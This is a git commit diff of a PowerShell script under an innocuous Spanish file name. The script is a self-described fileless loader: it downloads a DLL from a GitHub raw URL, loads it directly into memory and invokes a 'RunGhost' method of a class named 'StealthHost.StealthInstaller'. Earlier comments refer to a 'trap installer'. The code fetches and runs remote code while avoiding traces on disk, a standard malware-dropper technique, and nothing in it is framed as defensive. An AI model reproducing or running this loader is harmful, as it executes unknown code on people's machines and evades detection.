f3061cc8f9262f52810d1b4be600b3a603273f3c
dps <7b1eahh@gmail.com>
2026-03-15 17:58:02 -0300

    Update Nuevo documento de texto.ps1

--- Nuevo documento de texto.ps1
+++ Nuevo documento de texto.ps1
@@ -1,8 +1,8 @@
-# ghost.ps1 - Carga en RAM absoluta
+# ghost.ps1 - Carga en RAM absoluta (Fileless)
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$url = "https://github.com/7b1eahh-lang/Hero/raw/refs/heads/main/sys.dll" # <--- Tu DLL compilada
+$url = "https://github.com/7b1eahh-lang/Hero/raw/refs/heads/main/sysm.dll"
 $bytes = (New-Object System.Net.WebClient).DownloadData($url)
 $assembly = [System.Reflection.Assembly]::Load($bytes)
 $class = $assembly.GetType("StealthHost.StealthInstaller")
-$method = $class.GetMethod("Uninstall") # <--- Tu método en InstaladorTrampa.cs
-$method.Invoke($null, @($null))
+$method = $class.GetMethod("RunGhost")
+$method.Invoke($null, $null)
